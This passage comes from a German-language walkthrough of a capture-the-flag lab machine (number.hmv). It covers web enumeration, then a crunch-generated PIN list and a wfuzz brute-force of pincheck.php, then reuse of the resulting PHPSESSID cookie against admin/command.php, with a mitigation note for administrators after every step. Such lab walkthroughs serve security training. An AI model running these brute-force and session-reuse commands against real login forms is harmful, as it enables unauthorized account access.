            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Anmeldedaten fÃ¼r dieses Formular zu finden. Dies kÃ¶nnte durch Brute-Force-Angriffe auf das Formular oder durch das Auslesen von Anmeldedaten aus anderen Quellen geschehen, falls solche gefunden werden. ÃœberprÃ¼fen Sie auch den Quellcode von <code>admincheck.php</code>, falls zugÃ¤nglich, auf Schwachstellen.<br><strong>Empfehlung (Admin):</strong> SchÃ¼tzen Sie Admin-Bereiche durch starke Authentifizierung (komplexe PasswÃ¶rter, Multi-Faktor-Authentifizierung). Implementieren Sie Ratenbegrenzung und Lockout-Mechanismen gegen Brute-Force-Angriffe. Ãœberwachen Sie fehlgeschlagene Anmeldeversuche.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/admin/admincheck.php</span>

<span class="command">No...</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich rufe das Skript <code>admincheck.php</code> direkt auf, wahrscheinlich ohne POST-Parameter, um zu sehen, wie es reagiert. Die Antwort ist einfach 'No...'. FÃ¼r Laien: Ich habe das Programm, das die Anmeldedaten prÃ¼ft, direkt angesprochen, ohne Benutzername und Passwort einzugeben. Es hat einfach nur 'No...' geantwortet. FÃ¼r Experten: Der direkte Aufruf von <code>admincheck.php</code> ohne die erwarteten POST-Parameter fÃ¼hrt zu einer einfachen 'No...' Antwort. Dies bestÃ¤tigt, dass das Skript existiert und ausgefÃ¼hrt wird, aber keine detaillierten Fehlermeldungen oder Informationen preisgibt, was die Black-Box-Analyse des Anmeldevorgangs erschwert.</p>
            <p class="evaluation"><strong>Bewertung:</strong> <code>admincheck.php</code> gibt eine generische Fehlermeldung zurÃ¼ck, was die Informationsbeschaffung durch direkte Anfragen erschwert. Die Black-Box-Analyse oder das Brute-Forcing des Anmeldeformulars sind weiterhin notwendig.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, das Anmeldeformular mit WÃ¶rterlisten anzugreifen oder Anmeldedaten aus anderen Quellen zu finden.<br><strong>Empfehlung (Admin):</strong> Eine generische Fehlermeldung ist besser als detaillierte Informationen preiszugeben, die einem Angreifer helfen kÃ¶nnten.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/index.html</span>

<span class="password">Good luck.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich greife auf die Datei <code>/index.html</code> auf der Hauptseite zu (die auch Ã¼ber <code>/</code> erreichbar ist). Der Inhalt ist die einfache Zeichenkette 'Good luck.'. FÃ¼r Laien: Ich schaue mir wieder die Hauptseite an, und dort steht nur 'Good luck.'. FÃ¼r Experten: Eine einfache index.html-Seite ohne viel Inhalt ist typisch. Die Nachricht 'Good luck.' ist ein Hinweis von den Erstellern der VM.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Inhalt von <code>index.html</code> ist ein reiner Hinweis und liefert keine direkte technische Schwachstelle, aber er bestÃ¤tigt die Erreichbarkeit der Hauptseite.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie sich den Hinweis. Konzentrieren Sie sich auf die funktionalen Endpunkte.<br><strong>Empfehlung (Admin):</strong> Ein einfacher Platzhalter oder Hinweis. Keine sicherheitsrelevanten Implikationen.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/pin/pincheck.php</span>

<span class="password">PIN WRONG.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich rufe das Skript <code>/pin/pincheck.php</code> direkt auf, wahrscheinlich ohne Parameter, da Feroxbuster es als zugÃ¤nglich identifiziert hat. Die Antwort ist 'PIN WRONG.'. FÃ¼r Laien: Ich schaue mir eine andere Webseite im Ordner <code>/pin</code> an, die 'pincheck.php' heiÃŸt. Sie sagt einfach nur 'PIN WRONG.'. Das deutet darauf hin, dass sie einen PIN erwartet. FÃ¼r Experten: Das Skript <code>pincheck.php</code> existiert und verarbeitet Anfragen, die offenbar einen PIN beinhalten. Die Antwort 'PIN WRONG.' ist eine spezifische Fehlermeldung, die auf das Fehlen oder die UngÃ¼ltigkeit eines erwarteten PINs hinweist. Dies bestÃ¤tigt die Notwendigkeit, einen PIN zu finden.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Existenz eines PIN-PrÃ¼f-Skripts (<code>pincheck.php</code>) und die spezifische Fehlermeldung sind ein starker Hinweis auf einen PIN-basierten Authentifizierungsmechanismus in diesem Bereich der Webseite. Dies ist ein wichtiger Zugangspunkt, der die Kompromittierung oder das Brute-Forcing des PINs erfordert.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Verzeichnis <code>/pin/</code> und seine Dateien (insbesondere <code>index.php</code> und <code>pincheck.php</code>) genauer. Versuchen Sie herauszufinden, wie der PIN Ã¼bergeben wird (GET, POST?) und wie viele Stellen er hat (Nikto deutete auf 4 Ziffern hin). Planen Sie ein Brute-Force-Angriff auf den PIN.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie starke Authentifizierungsmechanismen. PIN-basierte Authentifizierung (insbesondere kurze, numerische PINs) ist oft schwach. Implementieren Sie Ratenbegrenzung und Lockout gegen Brute-Force-Angriffe.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/admin/command.php</span>

<span class="password">ACCESS NOT GRANTED.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich greife auf die Datei <code>/admin/command.php</code> zu, die Feroxbuster und Nikto im <code>/admin/</code> Verzeichnis gefunden haben und die nach einer BefehlsausfÃ¼hrungsfunktion klingt. Die Antwort ist 'ACCESS NOT GRANTED.'. FÃ¼r Laien: Ich versuche, eine Webseite im Ordner <code>/admin</code> zu besuchen, die 'command.php' heiÃŸt und nach einem Ort klingt, an dem man Befehle eingeben kann. Aber der Computer sagt nur: 'Zugriff nicht gewÃ¤hrt!'. Das deutet darauf hin, dass diese Seite nur fÃ¼r angemeldete Benutzer zugÃ¤nglich ist. FÃ¼r Experten: Die spezifische Fehlermeldung 'ACCESS NOT GRANTED.' deutet darauf hin, dass das Skript <code>command.php</code> existiert und verarbeitet wird, aber eine Authentifizierung oder eine bestimmte Sitzung (z.B. eine erfolgreiche Anmeldung im Admin-Bereich oder Ã¼ber den PIN-Bereich) erforderlich ist, um vollen Zugriff zu erhalten. Dies bestÃ¤tigt, dass <code>command.php</code> eine interessante FunktionalitÃ¤t bietet, die aber nur nach erfolgreicher Authentifizierung zugÃ¤nglich ist.</p>
            <p class="evaluation"><strong>Bewertung:</strong> <code>/admin/command.php</code> ist eine geschÃ¼tzte Ressource, die wahrscheinlich erst nach einer erfolgreichen Anmeldung im Admin-Bereich oder mÃ¶glicherweise im PIN-Bereich zugÃ¤nglich wird. Dies ist ein klares Ziel nach erfolgreicher Authentifizierung.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, zuerst Zugriff auf den Admin-Bereich (via Login-Formular) oder den PIN-Bereich (via PIN-Check) zu erlangen. Sobald authentifiziert, greifen Sie erneut auf <code>/admin/command.php</code> zu, um seine FunktionalitÃ¤t zu prÃ¼fen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie robuste Zugriffskontrollen fÃ¼r sensitive Endpunkte wie <code>admin/command.php</code>. Stellen Sie sicher, dass die AutorisierungsprÃ¼fung korrekt erfolgt und nicht umgangen werden kann.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/pin/</span>

<span class="password">Enter your PIN (4 digits) to log in.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich greife auf das Verzeichnis <code>http://number.hmv/pin/</code> zu. Die Ausgabe ist eine einfache HTML-Seite, die eine klare Anweisung gibt: 'Enter your PIN (4 digits) to log in.'. FÃ¼r Laien: Ich besuche die Hauptseite im Ordner <code>/pin</code>. Dort steht, dass ich meine geheime Nummer (einen 4-stelligen PIN) eingeben soll, um mich anzumelden. FÃ¼r Experten: Die Seite <code>/pin/index.php</code> (impliziert durch den Zugriff auf das Verzeichnis) zeigt ein Formular (oder zumindest Text, der darauf hindeutet), das einen 4-stelligen numerischen PIN erwartet. Dies bestÃ¤tigt die Struktur und den erwarteten Input fÃ¼r den PIN-basierten Authentifizierungsmechanismus, der Ã¼ber <code>pincheck.php</code> verarbeitet wird.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Seite bestÃ¤tigt, dass ein 4-stelliger numerischer PIN fÃ¼r die Anmeldung im PIN-Bereich erforderlich ist. Dies ist eine sehr kleine Anzahl von MÃ¶glichkeiten (10^4 = 10.000), was Brute-Force-Angriffe praktikabel macht.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereiten Sie eine Wortliste mit allen 4-stelligen numerischen Kombinationen vor (0000 bis 9999) und fÃ¼hren Sie einen Brute-Force-Angriff auf das PIN-PrÃ¼f-Skript (<code>pincheck.php</code>) durch. Analysieren Sie die Antworten, um den korrekten PIN zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie stÃ¤rkere Authentifizierungsmechanismen als 4-stellige numerische PINs. Implementieren Sie Ratenbegrenzung und Account-Lockout gegen Brute-Force-Angriffe. Ãœberwachen Sie Anmeldeversuche auf <code>pincheck.php</code>.</p>
        </section>

              <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <!-- Fortsetzung Web Enumeration -->

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">crunch 4 4 0123456789 -o pins.txt</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">Crunch will now generate the following amount of data: 50000 bytes</span>
<span class="command">0 MB</span>
<span class="command">0 GB</span>
<span class="command">0 TB</span>
<span class="command">0 PB</span>
<span class="command">Crunch will now generate the following number of lines: 10000</span>

<span class="password">crunch: 100% completed generating output</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nachdem wir herausgefunden haben, dass ein 4-stelliger numerischer PIN fÃ¼r den Zugriff auf den <code>/pin/</code>-Bereich erforderlich ist, nutze ich das Tool <code>crunch</code>, um eine Wortliste mit allen mÃ¶glichen Kombinationen zu erstellen. Der Befehl <code>crunch 4 4 0123456789 -o pins.txt</code> weist <code>crunch</code> an, alle Variationen von Zeichenketten mit einer LÃ¤nge von 4 (Minimum und Maximum 4) zu generieren, die nur aus den Ziffern 0 bis 9 bestehen (<code>0123456789</code>), und die Ausgabe in der Datei <code>pins.txt</code> zu speichern. FÃ¼r Laien: Ich benutze ein Programm, um eine Liste mit allen mÃ¶glichen 4-stelligen Geheimnummern (von 0000 bis 9999) zu erstellen und diese in einer Datei zu speichern. FÃ¼r Experten: <code>crunch</code> ist ein mÃ¤chtiges Wortlistengenerierungstool. Die Spezifikation '4 4' und der Zeichensatz '0123456789' erzeugen exakt 10.000 Kombinationen (10^4), was die gesamte AngriffsflÃ¤che fÃ¼r einen 4-stelligen numerischen PIN abdeckt. Die Ausgabe wird in <code>pins.txt</code> gespeichert, um sie mit einem Brute-Force-Tool zu verwenden.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Wortliste <code>pins.txt</code> wurde erfolgreich mit allen 10.000 mÃ¶glichen 4-stelligen numerischen PINs erstellt. Dies ist die notwendige Grundlage fÃ¼r einen Brute-Force-Angriff auf das PIN-PrÃ¼f-Skript.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die erstellte Datei <code>pins.txt</code> als Wortliste in einem Web-Brute-Force-Tool (z.B. wfuzz, Hydra), um den korrekten PIN fÃ¼r <code>pincheck.php</code> zu finden. Zuerst mÃ¼ssen Sie herausfinden, wie das Skript auf einen korrekten PIN reagiert.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie lÃ¤ngere und komplexere PINs oder PasswÃ¶rter. Implementieren Sie Ratenbegrenzung und Account-Lockout, um Brute-Force-Angriffe auf Anmeldeformulare zu verhindern.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl -X POST -d "password=1111" http://number.hmv/pin/pincheck.php -s| wc -c</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">10</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Bevor ich einen Brute-Force-Angriff starte, teste ich, wie das Skript <code>pincheck.php</code> auf einen falschen PIN reagiert, insbesondere in Bezug auf die GrÃ¶ÃŸe der Antwort. Ich sende eine POST-Anfrage (<code>-X POST</code>) mit dem Parameter <code>password=1111</code> (ein offensichtlich falscher PIN) an <code>http://number.hmv/pin/pincheck.php</code>. Die Ausgabe pipe ich an <code>wc -c</code>, das die Anzahl der Bytes (Zeichen) im Output zÃ¤hlt. Der <code>-s</code> Parameter bei <code>curl</code> unterdrÃ¼ckt die Fortschrittsanzeige. Die Ausgabe zeigt <code>10</code>. FÃ¼r Laien: Ich schicke dem PIN-Programm absichtlich eine falsche Geheimnummer und messe, wie lang die Antwort ist, die ich zurÃ¼ckbekomme. Die LÃ¤nge ist 10 Zeichen. Das hilft mir, spÃ¤ter den richtigen PIN zu finden, indem ich nach einer Antwort suche, die *nicht* 10 Zeichen lang ist. FÃ¼r Experten: Das PrÃ¼fen der AntwortgrÃ¶ÃŸe bei einer fehlgeschlagenen Authentifizierung ist eine Standardtechnik fÃ¼r Blind Brute-Force-Angriffe. Wenn die Antwort fÃ¼r einen korrekten PIN eine andere GrÃ¶ÃŸe hat, kann dies als Indikator fÃ¼r einen erfolgreichen Versuch verwendet werden. Die festgestellte GrÃ¶ÃŸe fÃ¼r einen falschen PIN ist 10 Bytes.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Eine falsche PIN-Eingabe fÃ¼hrt zu einer Antwort von 10 Bytes (wahrscheinlich der Text 'PIN WRONG.' plus eventuelle unsichtbare Zeichen wie ZeilenumbrÃ¼che). Dies gibt mir einen klaren Indikator, den ich bei meinem Brute-Force-Angriff verwenden kann, um erfolgreiche Versuche zu identifizieren: Ich suche nach Antworten, deren GrÃ¶ÃŸe *nicht* 10 Bytes betrÃ¤gt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese AntwortgrÃ¶ÃŸe (10 Bytes) als negativen Filter in Ihrem Brute-Force-Tool. Konfigurieren Sie das Tool so, dass es alle PINs aus <code>pins.txt</code> testet und nur Antworten anzeigt, die *nicht* 10 Bytes groÃŸ sind (z.B. mit <code>--hh 10</code> in wfuzz).<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie, dass Fehlermeldungen bei der Authentifizierung unterschiedliche GrÃ¶ÃŸen haben, da dies Blind Brute-Force-Angriffe ermÃ¶glicht. Eine feste AntwortgrÃ¶ÃŸe (Timing-Angriffe sind schwerer, aber auch mÃ¶glich) oder variable FÃ¼llzeichen kÃ¶nnen dies mitigieren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">wfuzz -c -w pins.txt -d "password=FUZZ" --hc 404 --hh 10 http://number.hmv/pin/pincheck.php</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">Target: http://number.hmv/pin/pincheck.php</span>
<span class="command">Total requests: 10000</span>

<span class="password">=====================================================================</span>
<span class="command">ID           Response   Lines    Word       Chars       Payload</span>
<span class="password">=====================================================================</span>

<span class="command">000004445:   200        0 L      3 W        21 Ch       "4444"</span>

<span class="command">Total time: 0</span>
<span class="command">Processed Requests: 10000</span>
<span class="command">Filtered Requests: 9999</span>
<span class="command">Requests/sec.: 0</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich fÃ¼hre einen Brute-Force-Angriff auf das Skript <code>pincheck.php</code> unter Verwendung von <code>wfuzz</code> durch. Der Befehl ist <code>wfuzz -c -w pins.txt -d "password=FUZZ" --hc 404 --hh 10 http://number.hmv/pin/pincheck.php</code>. <code>-c</code> fÃ¤rbt die Ausgabe. <code>-w pins.txt</code> verwendet die zuvor erstellte Wortliste als Payload-Quelle. <code>-d "password=FUZZ"</code> gibt an, dass die Werte aus der Wortliste in einem POST-Request (impliziert durch <code>-d</code>) als Wert fÃ¼r den Parameter <code>password</code> eingefÃ¼gt werden sollen, anstelle des <code>FUZZ</code>-Keywords. <code>--hc 404</code> verbirgt Antworten mit Statuscode 404. <code>--hh 10</code> **versteckt Antworten, deren Body genau 10 Bytes lang ist** (basierend auf meinem vorherigen Test mit einem falschen PIN). Der Angriff testet alle 10.000 PINs. Die Ausgabe zeigt einen einzigen Treffer: <code>000004445: 200 0 L 3 W 21 Ch "4444"</code>. FÃ¼r Laien: Ich benutze ein Programm, um alle 10.000 Geheimnummern aus meiner Liste (pins.txt) auszuprobieren und sie an das PIN-Programm zu schicken. Ich sage dem Programm, es soll nur die Antworten zeigen, die *nicht* die falsche GrÃ¶ÃŸe (10 Zeichen) haben. Und es findet eine Nummer (4444), die eine andere GrÃ¶ÃŸe zurÃ¼ckgibt! Das ist wahrscheinlich die richtige Geheimnummer! FÃ¼r Experten: Wfuzz testet jeden PIN in der Wortliste. Der Filter <code>--hh 10</code> ist entscheidend, um den korrekten PIN zu isolieren, da nur ein korrekter PIN eine AntwortgrÃ¶ÃŸe ungleich 10 Bytes (hier 21 Bytes) zurÃ¼ckgibt. Der gefundene PIN ist <code>4444</code>, der einen Status 200 (OK) und eine Body-GrÃ¶ÃŸe von 21 Bytes zurÃ¼ckgibt.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Brute-Force-Angriff war erfolgreich. Der korrekte PIN fÃ¼r den <code>/pin/</code>-Bereich ist <code>4444</code>. Die AntwortgrÃ¶ÃŸe von 21 Bytes fÃ¼r den korrekten PIN unterscheidet sich klar von der 10 Bytes bei falschem PIN.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der PIN <code>4444</code> ist gefunden. Nutzen Sie diesen PIN, um Zugriff auf den <code>/pin/</code>-Bereich zu erhalten und nach weiterer FunktionalitÃ¤t oder Schwachstellen zu suchen. PrÃ¼fen Sie, ob der Zugang zum <code>/admin/command.php</code> nun mÃ¶glich ist.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie umgehend Ratenbegrenzung und Account-Lockout, um Brute-Force-Angriffe zu verhindern. Verwenden Sie lÃ¤ngere, komplexere, nicht-numerische PINs oder PasswÃ¶rter. Vermeiden Sie, dass unterschiedliche Authentifizierungs-Ergebnisse zu Antworten unterschiedlicher GrÃ¶ÃŸe fÃ¼hren.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/pin/pincheck.php</span>

<span class="password">PIN CORRECT, WELCOME.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich teste den gefundenen PIN <code>4444</code> manuell, indem ich eine POST-Anfrage mit <code>password=4444</code> an <code>http://number.hmv/pin/pincheck.php</code> sende (wahrscheinlich Ã¼ber den Browser oder <code>curl</code>). Die Antwort des Servers ist 'PIN CORRECT, WELCOME.'. FÃ¼r Laien: Ich gebe die gefundene Geheimnummer (4444) in das Programm ein, das Geheimnummern prÃ¼ft. Und es sagt: 'Geheimnummer richtig, willkommen!'. Das bestÃ¤tigt, dass die Nummer stimmt. FÃ¼r Experten: Die manuelle Verifizierung des PINs <code>4444</code> durch Senden einer POST-Anfrage und der Erhalt der BestÃ¤tigungsnachricht 'PIN CORRECT, WELCOME.' bestÃ¤tigt die GÃ¼ltigkeit des PINs und den erfolgreichen 'Login' in den PIN-geschÃ¼tzten Bereich.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der PIN <code>4444</code> ist korrekt und ermÃ¶glicht den Zugriff auf den PIN-geschÃ¼tzten Bereich. Dies ist ein wichtiger Schritt zum Initial Access.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie nun, welche Ressourcen oder FunktionalitÃ¤ten nach Eingabe des korrekten PINs zugÃ¤nglich sind. PrÃ¼fen Sie insbesondere den Zugriff auf <code>/admin/command.php</code> und ob in diesem Bereich neue Links oder Formulare sichtbar werden.<br><strong>Empfehlung (Admin):</strong> Verbessern Sie den PIN-Mechanismus (LÃ¤nge, KomplexitÃ¤t, Brute-Force-Schutz). Die spezifische BestÃ¤tigung 'PIN CORRECT, WELCOME.' ist klar, aber die SchwÃ¤che lag im Brute-Forcing-Schutz.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="password">view-source:http://number.hmv/pin/pincheck.php</span>

<span class="command">PHPSESSID	"20p88f6d7mmh57ja9d2i416dmj"</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nach der erfolgreichen PIN-Anmeldung Ã¼berprÃ¼fe ich den Quellcode der Seite <code>/pin/pincheck.php</code> (oder die Seite, auf die ich nach dem korrekten PIN weitergeleitet werde), um nach Informationen zu suchen. Der wichtige Fund ist hier, dass ein Session-Cookie gesetzt wird: <code>PHPSESSID "20p88f6d7mmh57ja9d2i416dmj"</code>. Dies bedeutet, dass nach der korrekten PIN-Eingabe eine PHP-Session gestartet oder reaktiviert wird, die meinen 'angemeldeten' Zustand speichert. Der Wert des Session-Cookies ist <code>20p88f6d7mmh57ja9d2i416dmj</code>. FÃ¼r Laien: Nachdem ich die richtige Geheimnummer eingegeben habe, gibt mir die Webseite einen speziellen 'Ausweis' (einen Session-Cookie mit einer Nummer). Diesen 'Ausweis' zeige ich der Webseite bei jedem weiteren Besuch, damit sie weiÃŸ, dass ich die Geheimnummer schon eingegeben habe und 'drin' bin. Die 'Ausweisnummer' ist <code>20p88f6d7mmh57ja9d2i416dmj</code>. FÃ¼r Experten: Die Verwendung von PHP Sessions (erkennbar am <code>PHPSESSID</code>-Cookie) zur Verwaltung des Authentifizierungsstatus ist Standard. Der nach erfolgreicher PIN-Validierung erhaltene <code>PHPSESSID</code>-Cookie ist der 'SchlÃ¼ssel' zur Sitzung. Durch das MitfÃ¼hren dieses Cookies bei nachfolgenden Anfragen kann ich auf Ressourcen zugreifen, die nur fÃ¼r Benutzer mit einer gÃ¼ltigen Session zugÃ¤nglich sind.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das <code>PHPSESSID</code>-Cookie ist der Beweis fÃ¼r eine erfolgreiche Authentifizierung im PIN-Bereich. Mit diesem Cookie kann ich nun versuchen, auf geschÃ¼tzte Ressourcen zuzugreifen, insbesondere auf <code>/admin/command.php</code>, von dem ich zuvor 'ACCESS NOT GRANTED.' erhalten habe.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den erhaltenen <code>PHPSESSID</code>-Cookie (<code>20p88f6d7mmh57ja9d2i416dmj</code>) in allen nachfolgenden Anfragen, um sich als authentifiziert zu prÃ¤sentieren. Greifen Sie gezielt auf <code>http://number.hmv/admin/command.php</code> zu und analysieren Sie dessen FunktionalitÃ¤t.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Session-IDs sicher generiert werden (hohe Entropie) und korrekt gehandhabt werden. Session-Hijacking ist ein Risiko, wenn Session-IDs kompromittiert werden (hier durch den Brute-Force des PINs ermÃ¶glicht).</p>
        </section>

        <section id="initial-access">
            <h2>Initial Access</h2>
            <!-- Fortsetzung Initial Access -->

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" http://number.hmv/admin/command.php</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">ACCESS NOT GRANTED.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Mit dem erhaltenen <code>PHPSESSID</code>-Cookie (<code>20p88f6d7mmh57ja9d2i416dmj</code>) versuche ich, auf <code>http://number.hmv/admin/command.php</code> zuzugreifen, indem ich das Cookie in meiner <code>curl</code>-Anfrage mitfÃ¼hre (<code>--cookie "PHPSESSID=..."</code>). Ich sende eine einfache GET-Anfrage. Die Antwort ist jedoch immer noch 'ACCESS NOT GRANTED.'. FÃ¼r Laien: Ich versuche, die Webseite 'command.php' im Ordner <code>/admin</code> zu besuchen, diesmal mit meinem 'Ausweis' (dem Session-Cookie), den ich nach Eingabe der richtigen Geheimnummer bekommen habe. Aber der Computer sagt immer noch: 'Zugriff nicht gewÃ¤hrt!'. Das ist komisch. FÃ¼r Experten: Die Tatsache, dass der Zugriff auf <code>/admin/command.php</code> trotz gÃ¼ltiger Session (verifiziert durch erfolgreichen PIN-Login) immer noch verweigert wird, deutet darauf hin, dass die Authentifizierung Ã¼ber den PIN-Bereich nicht ausreicht, um Zugriff auf den Admin-Bereich zu erhalten. MÃ¶glicherweise sind separate Anmeldedaten fÃ¼r den Admin-Bereich erforderlich, oder die Session aus dem PIN-Bereich gewÃ¤hrt keine ausreichenden Berechtigungen fÃ¼r den Admin-Bereich.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Session aus dem PIN-Bereich scheint keinen direkten Zugriff auf <code>/admin/command.php</code> zu gewÃ¤hren. Die Authentifizierung fÃ¼r <code>command.php</code> ist mÃ¶glicherweise separat oder an stÃ¤rkere Berechtigungen gekoppelt als die einfache PIN-Authentifizierung.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Authentifizierung Ã¼ber den PIN-Bereich allein reicht nicht aus. Die primÃ¤ren Ziele sind weiterhin: 1. Den tatsÃ¤chlichen Anmeldevorgang fÃ¼r den Admin-Bereich (via <code>admin/index.php</code> und <code>admincheck.php</code>) zu kompromittieren oder 2. Weitere Informationen Ã¼ber den Zweck des PIN-Bereichs zu finden und ob dieser andere geschÃ¼tzte Ressourcen freischaltet. PrÃ¼fen Sie die anderen Dateien im <code>/pin/</code> Verzeichnis, insbesondere <code>whoami.php</code>.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine klare Trennung der Berechtigungen zwischen verschiedenen Bereichen der Webanwendung. Stellen Sie sicher, dass die Authentifizierung in einem Bereich nicht ungewollt Zugriff auf andere, sensiblere Bereiche gewÃ¤hrt.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" "http://number.hmv/admin/command.php?parameter_name=id"</span></span>
<span class="password">ACCESS NOT GRANTED.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich teste weiterhin den Zugriff auf <code>/admin/command.php</code> mit dem gÃ¼ltigen Session-Cookie, diesmal unter Ãœbergabe eines GET-Parameters (<code>?parameter_name=id</code>), um zu prÃ¼fen, ob das Skript auf Parameter reagiert, auch wenn der Zugriff verweigert wird. Die Antwort ist immer noch 'ACCESS NOT GRANTED.'. FÃ¼r Laien: Ich versuche wieder, die Seite 'command.php' mit meinem 'Ausweis' zu besuchen, gebe ihr aber dabei eine zusÃ¤tzliche 'Notiz' (einen Parameter in der Adresse) mit. Aber sie lÃ¤sst mich immer noch nicht rein. FÃ¼r Experten: Das Skript ignoriert offenbar den Ã¼bergebenen GET-Parameter, solange keine ausreichende Authentifizierung vorliegt. Die Zugriffsverweigerung erfolgt, bevor die Parameter verarbeitet werden.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Zugang zu <code>/admin/command.php</code> bleibt mit der PIN-Session verweigert, unabhÃ¤ngig von den GET-Parametern.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie dasselbe mit POST-Parametern, da das Admin-Login-Formular POST verwendet. Wenn auch das fehlschlÃ¤gt, ist klar, dass die PIN-Session allein nicht ausreicht.<br><strong>Empfehlung (Admin):</strong> Robuste Zugriffskontrollen sollten die Parameterverarbeitung vor der AutorisierungsprÃ¼fung blockieren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" -X POST -d "parameter_name=id" http://number.hmv/admin/command.php</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">ACCESS NOT GRANTED.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich sende eine POST-Anfrage (<code>-X POST -d "parameter_name=id"</code>) an <code>/admin/command.php</code>, diesmal mit dem gÃ¼ltigen Session-Cookie. Die Antwort ist immer noch 'ACCESS NOT GRANTED.'. FÃ¼r Laien: Ich probiere es nochmal mit der Seite 'command.php' und meinem 'Ausweis', schicke aber diesmal die zusÃ¤tzliche 'Notiz' (den Parameter) auf eine andere Weise (im 'KÃ¶rper' der Nachricht, wie es die Anmeldeseite tut). Aber immer noch sagt der Computer: 'Zugriff nicht gewÃ¤hrt!'. Es scheint wirklich am 'Ausweis' (der Session aus dem PIN-Bereich) zu liegen. FÃ¼r Experten: Die Versuche, Parameter Ã¼ber GET oder POST an <code>/admin/command.php</code> zu Ã¼bergeben, wÃ¤hrend nur mit der PIN-Session authentifiziert, schlagen fehl. Dies bestÃ¤tigt, dass die PIN-Authentifizierung nicht genÃ¼gend Rechte fÃ¼r den Admin-Bereich gewÃ¤hrt. Es ist notwendig, entweder separate Admin-Anmeldedaten zu finden oder herauszufinden, wie der PIN-Bereich tatsÃ¤chlich privilegierten Zugriff ermÃ¶glicht, falls nicht auf <code>command.php</code>.</p>
